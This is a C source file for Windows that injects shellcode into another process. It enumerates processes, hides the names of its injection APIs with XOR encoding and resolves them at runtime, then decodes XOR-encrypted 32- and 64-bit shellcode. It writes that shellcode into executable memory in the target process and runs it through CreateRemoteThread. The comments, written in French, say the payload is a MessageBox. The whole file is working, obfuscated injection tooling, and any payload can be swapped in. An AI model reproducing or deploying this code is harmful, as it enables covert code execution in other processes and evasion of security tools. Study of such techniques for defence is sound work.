#include <windows.h>
#include <tlhelp32.h>
#include <stdio.h>

typedef LPVOID (WINAPI* VirtualAllocEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD  flAllocationType, DWORD  flProtect);
typedef BOOL (WINAPI* WriteProcessMemory_t)(HANDLE hProcess, LPVOID lpBaseAddress, LPCVOID lpBuffer, SIZE_T nSize, SIZE_T *lpNumberOfBytesWritten);
typedef HANDLE (WINAPI* CreateRemoteThread_t)(HANDLE hProcess, LPSECURITY_ATTRIBUTES lpThreadAttributes, SIZE_T dwStackSize, LPTHREAD_START_ROUTINE lpStartAddress, LPVOID lpParameter, DWORD dwCreationFlags, LPDWORD lpThreadId);
typedef DWORD (WINAPI* WaitForSingleObject_t)(HANDLE hHandle, DWORD dwMilliseconds);
typedef BOOL (WINAPI* VirtualFreeEx_t)(HANDLE hProcess, LPVOID lpAddress, SIZE_T dwSize, DWORD dwFreeType);

void XOR(PUCHAR data, size_t data_sz, PUCHAR key, size_t key_sz){
    for (int i = 0; i < data_sz; i++){
        data[i] = data[i] ^ key[i%key_sz];
    }
}

BOOL isWow64(HANDLE hProcess) {
    BOOL bIsWow64 = FALSE;

    typedef BOOL (WINAPI *LPFN_ISWOW64PROCESS)(HANDLE, PBOOL);
    LPFN_ISWOW64PROCESS fnIsWow64Process = (LPFN_ISWOW64PROCESS)GetProcAddress(GetModuleHandle(TEXT("kernel32")), "IsWow64Process");

    if (fnIsWow64Process) {
        fnIsWow64Process(hProcess, &bIsWow64);
    }

    return bIsWow64;
}

int injectProc(int PID){
    int is64 = 0;
    UCHAR _VirtualAllocEx[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x28, 0x1f, 0x33, 0x0e, 0x3c, 0x2b, 0x11, 0x63 };
    UCHAR _WriteProcessMemory[] = { 0x25, 0x08, 0x0d, 0x1c, 0x0a, 0x20, 0x2d, 0x06, 0x10, 0x3a, 0x12, 0x2c, 0x23, 0x0c, 0x0e, 0x0a, 0x2d, 0x1e, 0x75 };
    UCHAR _CreateRemoteThread[] = { 0x31, 0x08, 0x01, 0x09, 0x1b, 0x15, 0x0d, 0x0c, 0x1e, 0x30, 0x15, 0x3a, 0x3a, 0x01, 0x11, 0x00, 0x3e, 0x03, 0x75 };
    UCHAR _WaitForSingleObject[] = { 0x25, 0x1b, 0x0d, 0x1c, 0x29, 0x1f, 0x2d, 0x3a, 0x1a, 0x31, 0x06, 0x33, 0x0b, 0x26, 0x01, 0x0f, 0x3a, 0x04, 0x01, 0x79 };
    UCHAR _VirtualFreeEx[] = { 0x24, 0x13, 0x16, 0x1c, 0x1a, 0x11, 0x33, 0x2f, 0x01, 0x3a, 0x04, 0x1a, 0x16, 0x69 };
    UCHAR key[] = { 0x72, 0x7a, 0x64, 0x68, 0x6f, 0x70, 0x5f, 0x69, 0x73, 0x5f, 0x61, 0x5f, 0x6e, 0x69, 0x63, 0x65, 0x5f, 0x67, 0x75, 0x79 };
    
    XOR(_VirtualAllocEx, sizeof(_VirtualAllocEx), key, sizeof(key));
    XOR(_WriteProcessMemory, sizeof(_WriteProcessMemory), key, sizeof(key));
    XOR(_CreateRemoteThread, sizeof(_CreateRemoteThread), key, sizeof(key));
    XOR(_WaitForSingleObject, sizeof(_WaitForSingleObject), key, sizeof(key));
    XOR(_VirtualFreeEx, sizeof(_VirtualFreeEx), key, sizeof(key));

    printf("\
Resolved functions : \n \
    %s \n \
    %s \n \
    %s \n \
    %s \n \
    %s \n", _VirtualAllocEx, _WriteProcessMemory, _CreateRemoteThread, _WaitForSingleObject, _VirtualFreeEx);

    HMODULE k32 = GetModuleHandle(TEXT("kernel32.dll"));
    VirtualAllocEx_t        pVirtualAllocEx      = (VirtualAllocEx_t) GetProcAddress(k32, (LPCSTR)_VirtualAllocEx);
    WriteProcessMemory_t    pWriteProcessMemory  = (WriteProcessMemory_t) GetProcAddress(k32, (LPCSTR)_WriteProcessMemory);
    CreateRemoteThread_t    pCreateRemoteThread  = (CreateRemoteThread_t) GetProcAddress(k32, (LPCSTR)_CreateRemoteThread);
    WaitForSingleObject_t   pWaitForSingleObject = (WaitForSingleObject_t) GetProcAddress(k32, (LPCSTR)_WaitForSingleObject);
    VirtualFreeEx_t         pVirtualFreeEx       = (VirtualFreeEx_t) GetProcAddress(k32, (LPCSTR)_VirtualFreeEx);

    // MessageBox shellcode ciphered
    UCHAR shellcode_32[] = { 0x8e, 0x92, 0xeb, 0x68, 0x6f, 0x70, 0x3f, 0x58, 0xa1, 0xd6, 0x84, 0x3b, 0xe5, 0x3b, 0x53, 0xee, 0x0d, 0x6b, 0xfe, 0x2b, 0x66, 0x75, 0xd3, 0x22, 0x49, 0xfb, 0x2d, 0x41, 0x42, 0xa0, 0x50, 0x9f, 0xc2, 0x55, 0x02, 0x19, 0x5d, 0x4b, 0x55, 0xb8, 0xbd, 0x77, 0x65, 0xaf, 0x26, 0x05, 0xb0, 0x3b, 0x24, 0xd4, 0x33, 0x4f, 0xe5, 0x2b, 0x5f, 0x64, 0x8f, 0xec, 0x35, 0x01, 0xf7, 0xba, 0x10, 0x24, 0x6e, 0xa0, 0xd4, 0x31, 0x53, 0x5e, 0xb2, 0xd4, 0x26, 0x71, 0x33, 0xe0, 0x96, 0x13, 0x49, 0x30, 0xf9, 0x4e, 0xef, 0x59, 0x90, 0x71, 0x89, 0x58, 0xb3, 0xf3, 0xa0, 0x90, 0x63, 0x68, 0xa4, 0x5d, 0xbf, 0x12, 0x81, 0x7a, 0x0f, 0x82, 0x5f, 0x15, 0x4b, 0x05, 0xbf, 0x31, 0xf8, 0x07, 0x45, 0x5e, 0xbd, 0x0f, 0xe8, 0x69, 0x14, 0xec, 0x2d, 0x65, 0x73, 0xa9, 0xef, 0x6c, 0xe4, 0x71, 0x8f, 0xe0, 0x37, 0x7b, 0x45, 0x04, 0x35, 0x08, 0x3a, 0x3f, 0x0e, 0x98, 0x95, 0x21, 0x2d, 0x20, 0xef, 0x7a, 0x86, 0xf0, 0xa0, 0x96, 0x8c, 0x02, 0x89, 0x54, 0x6e, 0x69, 0x63, 0x10, 0x2c, 0x02, 0x07, 0x4a, 0x40, 0x54, 0x00, 0x04, 0x03, 0x70, 0x37, 0x25, 0x04, 0x79, 0x66, 0xa0, 0xbb, 0x03, 0x63, 0x8d, 0x59, 0x67, 0x75, 0x79, 0x22, 0x0d, 0x0a, 0x0d, 0x0b, 0x70, 0xb7, 0x78, 0x73, 0x5f, 0x61, 0x16, 0x00, 0x03, 0x06, 0x06, 0x2b, 0x02, 0x11, 0x59, 0x10, 0x03, 0x44, 0x3a, 0x06, 0x14, 0x3e, 0x69, 0x19, 0x5f, 0x09, 0x1a, 0xed, 0x3f, 0x64, 0x9a, 0x8a, 0xdc, 0x95, 0x64, 0x58, 0x70, 0x0c, 0xce, 0xfa, 0xcd, 0xc2, 0x96, 0xa6, 0xdc, 0xa5, 0x77, 0x52, 0x6f, 0x1f, 0x6f, 0xdf, 0x9c, 0x95, 0x0c, 0x77, 0xc1, 0x23, 0x7b, 0x1d, 0x1f, 0x35, 0x69, 0x20, 0xa0, 0xb4 };
    UCHAR shellcode_64[] = { 0x8e, 0x32, 0xe5, 0x8c, 0x9f, 0x8f, 0xa0, 0x96, 0x9b, 0x93, 0x61, 0x5f, 0x6e, 0x28, 0x32, 0x24, 0x0f, 0x35, 0x3d, 0x48, 0xa0, 0x2b, 0x32, 0x0d, 0x27, 0xfb, 0x0d, 0x09, 0x3b, 0xd4, 0x33, 0x47, 0x26, 0xe2, 0x31, 0x45, 0x17, 0xec, 0x07, 0x29, 0x3a, 0x75, 0xd3, 0x22, 0x25, 0x3d, 0x6e, 0xa0, 0x3b, 0x6e, 0xa1, 0xf3, 0x52, 0x08, 0x1f, 0x67, 0x73, 0x47, 0x34, 0xb8, 0xbb, 0x77, 0x25, 0x69, 0xae, 0x92, 0xb2, 0x3b, 0x3b, 0xd4, 0x33, 0x7f, 0x2f, 0x38, 0xe8, 0x27, 0x63, 0x2f, 0x74, 0xa9, 0x14, 0xfb, 0x1c, 0x70, 0x64, 0x72, 0x50, 0xec, 0x01, 0x5f, 0x61, 0x5f, 0xe5, 0xe9, 0xeb, 0x65, 0x5f, 0x67, 0x3d, 0xfc, 0xb2, 0x0e, 0x03, 0x20, 0x6e, 0xa0, 0x0f, 0x2d, 0xf8, 0x1f, 0x41, 0xd4, 0x26, 0x71, 0x2a, 0x64, 0x8f, 0x84, 0x23, 0x31, 0x8d, 0xb3, 0x25, 0xe3, 0x5b, 0xf8, 0x17, 0x68, 0xa5, 0x12, 0x50, 0x96, 0x26, 0x58, 0xa3, 0x24, 0x9e, 0xae, 0x78, 0xd5, 0x33, 0x7b, 0xa5, 0x50, 0x8f, 0x05, 0xae, 0x25, 0x70, 0x13, 0x45, 0x57, 0x2b, 0x50, 0xb2, 0x10, 0x87, 0x3f, 0x31, 0xf2, 0x32, 0x5e, 0x2d, 0x69, 0xbf, 0x16, 0x1e, 0xe2, 0x7f, 0x17, 0x25, 0xd4, 0x2e, 0x75, 0x2a, 0x64, 0x8f, 0x26, 0xfe, 0x7d, 0xfa, 0x32, 0x65, 0xb8, 0x2e, 0x28, 0x1e, 0x31, 0x2d, 0x06, 0x3b, 0x1e, 0x36, 0x28, 0x3a, 0x24, 0x05, 0x2f, 0xf6, 0x95, 0x52, 0x3b, 0x36, 0x97, 0x8f, 0x28, 0x1e, 0x30, 0x29, 0x17, 0xea, 0x4d, 0x87, 0x22, 0x9c, 0x9a, 0xa0, 0x3a, 0x9d, 0x72, 0x72, 0x7a, 0x64, 0x1d, 0x1c, 0x15, 0x2d, 0x5a, 0x41, 0x71, 0x05, 0x33, 0x02, 0x69, 0x3a, 0x24, 0xe5, 0x2b, 0x02, 0x5f, 0x75, 0x85, 0xb1, 0x21, 0xa8, 0xb1, 0x5f, 0x69, 0x73, 0x5f, 0x89, 0x4e, 0x6e, 0x69, 0x63, 0x2c, 0x31, 0x0d, 0x10, 0x1a, 0x06, 0x1f, 0x00, 0x48, 0x0d, 0x09, 0x7f, 0x3b, 0x1a, 0x3b, 0x00, 0x5f, 0x34, 0x81, 0x65, 0x65, 0x5f, 0x67, 0x25, 0x0e, 0x1c, 0x1f, 0x00, 0x68, 0x2e, 0x28, 0x17, 0x58, 0xba, 0x1e, 0xdb, 0x1a, 0xed, 0x3f, 0x64, 0x9a, 0x8a, 0xdc, 0x95, 0x64, 0x58, 0x70, 0x25, 0xd2, 0xc9, 0xe5, 0xe2, 0xf4, 0x8c, 0x8a, 0x29, 0xdc, 0xaa, 0x41, 0x5f, 0x63, 0x23, 0x6d, 0xf5, 0x82, 0x92, 0x0f, 0x61, 0xd3, 0x28, 0x63, 0x2d, 0x06, 0x19, 0x5f, 0x38, 0x1e, 0xe7, 0xb3, 0x9c, 0xb0 };

    XOR(shellcode_32, sizeof(shellcode_32), key, sizeof(key));
    XOR(shellcode_64, sizeof(shellcode_64), key, sizeof(key));

    PUCHAR shellcode = nullptr;
    SIZE_T scSize = 0;
    // PROCESS_ALL_ACCESS -> on va lui trituré les intestins
    // FALSE -> on va pas créer de process child
    // le PID du process cible
    HANDLE hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, PID);

    if (!isWow64(hProcess)) {
        is64 = 1;
        shellcode = shellcode_64;
        scSize = sizeof(shellcode_64);
    } else {
        shellcode = shellcode_32;
        scSize = sizeof(shellcode_32);
    }
    // MEM_RESERVE -> Reserve un pool d'addr virtuel (Create VAD)
    // MEM_COMMIT -> Selon la taille alloué, pour chaque page 
    //                   -> Alloue une frame physique
    //                   -> Renseigne un PTE (Présent = 1 + (RX + RW)->(PAGE_EXECUTE_READWRITE))
    //                   -> Met à jour le VAD avec les info renseigné + Flush TLB (Translation Look-aside Buffer - Cache processeur pour les pages déjà lus)
    LPVOID memPoolPtr = pVirtualAllocEx(hProcess, NULL, scSize, (MEM_RESERVE | MEM_COMMIT), PAGE_EXECUTE_READWRITE);
    if (memPoolPtr == NULL) {
	    printf("VirtualAllocEx failed: %ul\n", GetLastError());
	    return 1;
    }
    printf("[+] Mem page allocated at: 0x%p\n", memPoolPtr);
    pWriteProcessMemory(hProcess, memPoolPtr, shellcode, scSize, NULL);
    printf("[+] Shellcode %s written\n", is64 ? "64bit" : "32bit");

    HANDLE hThread = pCreateRemoteThread(hProcess, NULL, 0, (LPTHREAD_START_ROUTINE)memPoolPtr, NULL, 0, NULL);
    if (hThread == NULL) {
        printf("CreateRemoteThread failed : %ul\n", GetLastError());
        return 1;
    }
    printf("[+] Remote thread created.\n");
    printf("[+] Waiting for thread.\n");
    pWaitForSingleObject(hThread, INFINITE);
    printf("[+] Sehellcode done.\n");

    pVirtualFreeEx(hProcess, memPoolPtr, 0, MEM_RELEASE);
    CloseHandle(hThread);
    CloseHandle(hProcess);

    return 0;
}

int enumProc(){
    int proc_cnt = 0;
    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof(PROCESSENTRY32);

    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    Process32First(snapshot, &pe32);

    do {
        printf("[PID: %u] %s\n", pe32.th32ProcessID, pe32.szExeFile);
        proc_cnt++;
    } while (Process32Next(snapshot, &pe32));

    CloseHandle(snapshot);
    return proc_cnt;
}

int main(int argc, char **argv){
    int proc_cnt = enumProc();
    if (proc_cnt <= 0) return 1;

    int choice = -1;
    while (choice <= 0) {
        printf("[PID] > ");
        scanf("%d", &choice);
        if (choice <= 4) {
            printf("[-] Bad PID.\n");
            choice = -1;
        }
    }

    return injectProc(choice);
}